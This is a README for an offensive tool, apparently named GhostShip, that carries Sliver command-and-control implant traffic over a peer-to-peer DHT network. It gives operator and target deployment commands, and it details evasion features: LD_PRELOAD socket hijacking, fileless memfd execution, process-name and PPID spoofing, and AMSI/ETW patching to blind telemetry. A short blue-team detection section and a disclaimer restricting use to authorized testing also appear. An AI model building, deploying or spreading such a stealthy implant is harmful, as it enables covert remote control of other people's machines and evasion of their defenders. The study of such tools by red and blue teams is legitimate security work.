# GhostShip

## P2P Command & Control Bridge
### v1.0.0-alpha

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Status: Alpha](https://img.shields.io/badge/Status-Alpha-red.svg)](#)

---

## Overview

**GhostShip** is a peer-to-peer (P2P) transport layer for [Sliver C2](https://github.com/BishopFox/sliver) that routes implant traffic through the [HyperDHT](https://github.com/holepunchto/hyperdht) network.

**Core concept:** The operator runs a bridge that exposes Sliver C2 via P2P. The implant connects to this bridge using only a connection key (`hs://...`). No public IPs, no domains, no traditional infrastructure.

---

## Project Status

| Component | Status | Notes |
|-----------|--------|-------|
| Linux Implant | ✅ Working | LD_PRELOAD stealth, memfd execution |
| Windows Implant | ✅ Working | Named Pipes, PPID Spoofing, AMSI/ETW patch |
| Bridge (Operator) | ✅ Working | Go and Node.js implementations |
| CI/CD | ✅ Working | Auto-builds armed binaries on release |
| Documentation | 🟡 Partial | Basic usage documented |

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              TARGET MACHINE                                  │
│                                                                             │
│  ┌─────────────┐    socketpair/    ┌─────────────┐                         │
│  │   Sliver    │    named pipe     │   Node.js   │                         │
│  │   Payload   │◄──────────────────►│   Client    │                         │
│  │  (mTLS)     │   (no TCP port)   │  (HyperDHT) │                         │
│  └─────────────┘                    └──────┬──────┘                         │
│        ▲                                   │                                │
│        │ LD_PRELOAD hook (Linux)           │ UDP/P2P                        │
│        │ or Named Pipe (Windows)           │                                │
└────────┼───────────────────────────────────┼────────────────────────────────┘
         │                                   │
         │                                   ▼
         │                          ┌───────────────┐
         │                          │   HyperDHT    │
         │                          │   Network     │
         │                          └───────┬───────┘
         │                                  │
         │                                  ▼
┌────────┼──────────────────────────────────────────────────────────────────┐
│        │                     OPERATOR MACHINE                              │
│        │                                                                   │
│        │              ┌─────────────┐         ┌─────────────┐             │
│        │              │   Bridge    │         │   Sliver    │             │
│        └──────────────│  (HyperDHT) │◄───────►│   Server    │             │
│                       │             │  TCP    │  (mTLS)     │             │
│                       └─────────────┘ :8888   └─────────────┘             │
│                                                                            │
│                       Connection Key: hs://abc123...                       │
└────────────────────────────────────────────────────────────────────────────┘
```

---

## Strengths

### What GhostShip Does Well

1. **Zero Infrastructure**
   - No public IP required for operator
   - No domain registration
   - No VPS to maintain or get seized
   - Connection key is the only "address"

2. **Stealth IPC (Linux)**
   - LD_PRELOAD hook intercepts Sliver's TCP `connect()`
   - Redirects to Unix socketpair
   - **No listening TCP ports** - `netstat`/`ss` shows nothing
   - All traffic flows through anonymous pipe

3. **Stealth IPC (Windows)**
   - Sliver uses native Named Pipe transport
   - No TCP listener on target
   - PPID Spoofing (appears as child of svchost.exe)
   - AMSI/ETW patching (blinds local telemetry)

4. **Fileless Execution (Linux)**
   - Node.js and Sliver payload loaded via `memfd_create`
   - Executed from memory, not disk
   - Process names spoofed as `[kworker/...]`

5. **Full Sliver Features**
   - All Sliver capabilities work: shell, upload, download, pivoting, etc.
   - No custom protocol limitations
   - Maintained by BishopFox

---

## Limitations

### What GhostShip Does NOT Hide

1. **Network Traffic is Visible**
   - UDP traffic to DHT peers is visible to network monitoring
   - Traffic patterns may be anomalous compared to normal user activity
   - DPI/ML-based detection could flag DHT traffic

2. **Processes are Visible**
   - `ps aux` shows running processes (even with spoofed names)
   - `/proc` filesystem exposes process information
   - Memory forensics can find payloads

3. **Not APT-Grade**
   - No kernel-level hiding
   - No rootkit capabilities
   - No anti-forensics beyond basic cleanup
   - Signatures will eventually be detected by EDR

4. **Operational Constraints**
   - Connection key must be delivered to target securely
   - If key is compromised, traffic can potentially be intercepted
   - Bridge must be running for implant to connect

5. **Binary Size**
   - ~70-100MB due to embedded Node.js runtime
   - Not suitable for size-constrained scenarios

---

## Quick Start

### 1. Operator Setup

```bash
# Terminal 1: Start Sliver C2
sliver-server
sliver > mtls --lport 8888

# Terminal 2: Start GhostShip Bridge
./bridge-linux --port 8888

# Output:
# ======================================================================
# GHOSTSHIP BRIDGE (v1.0.0) - OPERATOR SIDE
# ======================================================================
# Sliver Port:      8888
# Connection Key:   hs://a1b2c3d4e5f6...
# ======================================================================
```

### 2. Deploy on Target

```bash
# Linux
./ghostship-linux --connect "hs://a1b2c3d4e5f6..."

# Windows (PowerShell)
.\ghostship-windows.exe --connect "hs://a1b2c3d4e5f6..."
```

### 3. Receive Session

```
sliver > sessions

 ID   Transport   Remote Address   Hostname   Username   OS/Arch
 ==   =========   ==============   ========   ========   =======
 1    mtls        127.0.0.1:0      target     user       linux/amd64

sliver > use 1
sliver (OBJECTIVE_HORSE) > whoami
```

---

## Building from Source

### Prerequisites

- Go 1.21+
- Node.js 20+ (for bridge development)
- GCC (for Linux LD_PRELOAD hook)

### Manual Build

```bash
# 1. Download Node.js binary for target platform
# 2. Generate Sliver implant
# 3. Bundle assets
./bundle.sh /path/to/node /path/to/sliver-implant

# 4. Build
make build-linux   # or make build-windows
```

### CI/CD

The GitHub Actions workflow automatically:
1. Downloads Node.js for Linux and Windows
2. Generates Sliver implants with correct transport config
3. Compiles LD_PRELOAD hook (Linux)
4. Bundles everything into armed binaries
5. Creates release on tag push

---

## Project Structure

```
ghostship/
├── implant/
│   ├── main.go                 # Entry point
│   └── core/
│       ├── loader_linux.go     # Linux loader (memfd, LD_PRELOAD)
│       ├── loader_windows.go   # Windows loader (PPID spoof, AMSI)
│       ├── loader.go           # Asset extraction
│       └── assets/
│           ├── client.js       # P2P client (Linux)
│           ├── client-windows.js
│           └── native/
│               └── gshook.c    # LD_PRELOAD hook source
├── bridge/
│   ├── go/                     # Go bridge implementation
│   └── nodejs/                 # Node.js bridge implementation
└── .github/
    └── workflows/
        └── release.yml         # CI/CD pipeline
```

---

## Security Considerations

### For Red Teams

- Rotate connection keys between operations
- Monitor for DHT traffic signatures in target environment
- Consider traffic timing to avoid pattern detection
- Test against target's EDR before deployment

### For Blue Teams

- Monitor for unusual UDP traffic patterns (DHT)
- Look for processes with spoofed names (`[kworker/...]`)
- Check for LD_PRELOAD in process environment
- Monitor named pipe creation on Windows
- Memory scanning for Sliver signatures

---

## Roadmap

- [ ] Traffic obfuscation (domain fronting for DHT)
- [ ] Beacon mode (reduce persistent connection)
- [ ] Multi-operator support
- [ ] Connection key rotation
- [ ] Smaller binary size (custom Node.js build)

---

## Disclaimer

This project is for **authorized security research and penetration testing only**.

The authors are not responsible for misuse. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing.

---

## License

MIT License - See [LICENSE](LICENSE) for details.

---

*GhostShip - Sailing through the DHT.*
